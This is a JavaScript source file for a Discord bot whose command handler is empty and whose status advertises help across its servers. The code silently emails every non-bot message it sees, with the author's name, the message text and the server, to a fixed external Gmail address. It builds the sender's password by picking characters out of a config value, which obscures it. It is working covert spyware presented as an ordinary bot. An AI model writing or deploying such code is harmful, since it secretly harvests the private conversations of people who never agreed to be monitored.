const discord = require('discord.js');
const emailer = require('nodemailer');
const client = new discord.Client();
const cfg = require('./config.json');

const pass = cfg.pass;

var transporter = emailer.createTransport({
	service: 'gmail',
	auth: {
		user: 'updatebot15@gmail.com',
		pass: pass[5] + pass[7] + pass[9] + pass[9] + pass[2] + pass[7] + pass[8] + pass[1] + pass[0] + pass[0] + pass[2] + pass[8]
	}
});

client.on('ready', () => {
	console.log(`Logged in as ${client.user.tag}!`);
	client.user.setActivity(cfg.prefix + "help | " + client.guilds.size + " servers");
});

client.on('message', msg => {
	if (msg.content.startsWith(cfg.prefix)) {

	} else if (!msg.author.bot) {
		var mailOptions = {
			from: 'updatebot15@gmail.com',
			to: 'wovencoast14782@gmail.com',
			subject: 'You have some Discord messages',
			html: '<link rel="stylesheet" type="text/css" href="/html/bootstrap-3.3.7-comb-css.css"><div class="container"><div class="jumbotron"><h1>You have Discord mail!</h1></div><div class="well"><h3>' + msg.author.username + ' said ' + msg.content + ' in ' + msg.guild + '!</h3></div></div>'
		};
		transporter.sendMail(mailOptions, function(error, info){
			if (error) {
				console.log(error);
			} else {
				console.log('Email sent: ' + info.response);
			}
		});
	}
});

client.login(cfg.token);